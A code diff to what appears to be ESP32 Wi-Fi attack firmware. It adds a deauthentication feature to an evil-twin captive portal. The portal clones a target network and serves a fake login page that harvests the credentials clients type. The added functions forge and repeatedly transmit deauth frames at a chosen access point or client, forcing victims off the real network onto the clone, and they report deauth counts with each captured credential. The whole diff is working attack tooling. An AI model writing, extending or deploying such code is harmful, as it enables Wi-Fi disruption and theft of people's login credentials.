@@ -142,6 +142,14 @@ bool portalDnsActive = false;
 char portalCloneSsid[evilTwin::kMaxSsidBytes + 1] = {};
 uint8_t portalCloneChannel = 0;
 bool portalCloned = false;
+// Companion deauth run by the portal itself. An evil twin only works if
+// clients leave the real AP, so `wifi_evil_portal` can push them off the
+// target BSSID on its own cadence while it serves the login page. Frames go
+// out the same AP interface as the captive portal, on the clone's channel —
+// so the operator should clone on the target AP's channel for them to land.
+evilTwin::DeauthPlan portalDeauth{};
+uint32_t portalDeauthSent = 0;
+uint32_t lastPortalDeauthMs = 0;
 // Whether the served page came from LittleFS (reported to the operator).
 bool portalPageFromFile = false;
 // The login page served to AP clients. /example.html in LittleFS is the page
@@ -560,8 +568,38 @@ void stepDeauthFlood(uint32_t now) {
     publishAttackJson(doc, now);
 }
 
+// Fills the deauth counters into a portal frame. The operator needs to see the
+// companion attack running (and how many frames it managed to push) next to
+// each capture, so the same fields appear in the start frame and every capture.
+void reportPortalDeauth(JsonDocument &doc) {
+    doc["deauth"] = portalDeauth.enabled;
+    if (!portalDeauth.enabled) return;
+    char bssidText[wifiAttack::kMacTextBytes];
+    wifiAttack::formatMac(portalDeauth.bssid, bssidText, sizeof(bssidText));
+    doc["deauthBssid"] = bssidText;
+    doc["deauthSent"] = portalDeauthSent;
+}
+
+// Companion deauth for the portal: push clients off the target AP so they fall
+// back onto the clone. Frames are aimed at the target BSSID (or one named
+// client) — never broadcast — and repeat three times per tick because a
+// single management frame is routinely lost. Costs a handful of TX slots per
+// interval; loop() stays non-blocking.
+void stepPortalDeauth(uint32_t now) {
+    if (!portalDeauth.enabled) return;
+    if (static_cast<uint32_t>(now - lastPortalDeauthMs) < portalDeauth.intervalMs) return;
+    lastPortalDeauthMs = now;
+    const uint8_t *dest = portalDeauth.hasClient ? portalDeauth.client : wifiAttack::kBroadcastMac;
+    for (int i = 0; i < 3; ++i) {
+        const size_t length = wifiAttack::buildDeauth(dest, portalDeauth.bssid, portalDeauth.bssid,
+                                                      portalDeauth.reason, txFrame, sizeof(txFrame));
+        if (length != 0 && sendRawFrame(txFrame, length)) ++portalDeauthSent;
+    }
+}
+
 void stepPortal(uint32_t now) {
     if (portalDnsActive) portalDns.processNextRequest();
+    stepPortalDeauth(now);
 
     // Drain captured credential POST bodies. No periodic heartbeat: a streamed
     // sample must not be dropped by the 100 ms cadence and lose a capture.
@@ -573,6 +611,7 @@ void stepPortal(uint32_t now) {
         doc["kind"] = "evil_portal";
         doc["capture"] = sequence;
         doc["captures"] = attackCount;
+        reportPortalDeauth(doc);
         // The form fields behind the attempt, decoded from the same body and
         // kept alongside it, so the dashboard log shows what was typed
         // instead of raw form data. A body with no recognisable field reports
@@ -606,6 +645,7 @@ void stepPortal(uint32_t now) {
     }
 }
 
+
 void stepAttack(uint32_t now) {
     switch (attack) {
     case WifiAttack::Beacon: stepBeacon(now); break;
@@ -625,6 +665,11 @@ void stopAttack() {
     // Restore the pre-portal AP/radio without changing the operator's AP intent.
     wifiAp::endPortal();
     portalCloned = false;
+    // Drop the companion deauth with the portal: no frames may outlive the AP
+    // the portal owned, and the next run must not inherit this target.
+    portalDeauth = evilTwin::DeauthPlan{};
+    portalDeauthSent = 0;
+    lastPortalDeauthMs = 0;
     if (floodScanInFlight) esp_wifi_scan_stop();
     WiFi.scanDelete();
     floodScanInFlight = false;
@@ -706,6 +751,19 @@ CommandError startAttack(ActionId action, const ActionParams &params, const Acti
             if (!evilTwin::channelUsable(channel)) return CommandError::InvalidParams;
             portalCloneChannel = static_cast<uint8_t>(channel);
         }
+        // Companion deauth: enabled only when the operator asks for it, and
+        // then a target BSSID is mandatory (buildDeauthPlan refuses to widen
+        // the attack into a broadcast). Resolved before the AP comes up so a
+        // bad target costs nothing.
+        if (!evilTwin::buildDeauthPlan(params.present(2) && params.boolean(2),
+                                       params.present(3) ? std::string_view(params.string(3), params.stringLength(3))
+                                                         : std::string_view{},
+                                       params.present(4) ? std::string_view(params.string(4), params.stringLength(4))
+                                                         : std::string_view{},
+                                       params.present(5) ? params.integer(5) : 1,
+                                       params.present(6) ? params.integer(6) : 100, portalDeauth)) {
+            return CommandError::InvalidParams;
+        }
     } else {
         return CommandError::UnsupportedAction;
     }
@@ -773,6 +831,14 @@ CommandError startAttack(ActionId action, const ActionParams &params, const Acti
         doc["ssid"] = portalCloned ? portalCloneSsid : "";
         if (portalCloned) doc["channel"] = portalCloneChannel;
         doc["page"] = portalPageFromFile ? evilTwin::kPagePath : "builtin";
+        reportPortalDeauth(doc);
+        if (portalDeauth.enabled) {
+            // First deauth may go out on the very next poll, so the operator
+            // sees the companion attack act immediately rather than after one
+            // full interval.
+            lastPortalDeauthMs = attackStartMs - portalDeauth.intervalMs;
+            portalDeauthSent = 0;
+        }
         std::string payload;
         serializeJson(doc, payload);
         runtime.publishOutput(attackTicket, std::move(payload), attackStartMs);
